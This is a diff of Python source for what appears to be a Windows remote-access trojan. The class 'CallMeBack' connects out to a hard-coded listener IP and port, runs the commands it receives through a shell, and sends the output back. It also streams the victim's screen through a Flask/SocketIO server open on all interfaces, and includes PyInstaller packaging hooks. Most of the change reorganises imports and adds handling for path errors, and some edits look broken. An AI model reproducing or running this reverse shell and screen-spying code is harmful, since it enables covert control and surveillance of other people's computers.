@@ -9,6 +9,15 @@ from PIL import ImageGrab
 import sys
 import logging
 import threading
+import cv2
+import numpy as np
+from flask import Flask, Response
+from flask_socketio import SocketIO, emit
+import pyautogui
+     
+
+from PyInstaller.utils.hooks import collect_data_files
+datas = collect_data_files('flask_socketio','Flask',' Response','pyautogui')
 app =''
 LHOST = '10.195.100.240' # add ip address listner
 LPORT = int(7777) # add port
@@ -22,12 +31,7 @@ class CallMeBack:
         self.__Socket_SockClinet()
 
     def StreamChannel(self):            
-        import cv2
-        import numpy as np
-        from flask import Flask, Response
-        from flask_socketio import SocketIO, emit
 
-        import pyautogui
         app = Flask(__name__)
         socketio = SocketIO(app)
         log = logging.basicConfig(filename=os.environ["appdata"]+'\\'+'server.log', level=logging.INFO, format='%(asctime)s - %(message)s')
@@ -49,11 +53,10 @@ class CallMeBack:
         def index():                      
             return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
         if __name__=='__main__':
-            sys.stdout = sys.stdout.flush()
             socketio.run(app,host='0.0.0.0',port=int(f'{Port}'),debug=False)
-            
+            sys.stdout = sys.stdout.flush()
     def __Socket_SockClinet(self,LHOST=LHOST,LPORT=LPORT):
-        
+       
         global Stopthread       
         SendBack=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         SendBack.connect((LHOST,LPORT))
@@ -65,11 +68,16 @@ class CallMeBack:
                 exit()
             try:
                 Data = subprocess.run(data,shell=True,capture_output=True)
-                path = os.getcwd()+ ' > '  
+                if 'The system cannot find the path specified' in str(Data):
+                    HandelPath = str("".join(data.split()[1:])) +' The system cannot find the path specified.'.replace('\n','')
+                    SendBack.sendall(bytes(path.encode())), SendBack.sendall(HandelPath.encode()+'\n'.encode('latin-1'))
+                    SendBack.sendall(bytes(path.encode()))
+                else:                     
+                    path = os.getcwd()+ ' > '  
                 if 'quit' in data:
                     exit()
                 elif 'cd' in data:
-                    try:
+                   try:
                         os.chdir(str(" ".join(data.split()[1:])))
                         path = os.getcwd()+ ' > '
                         SendBack.sendall(bytes(path.encode()))
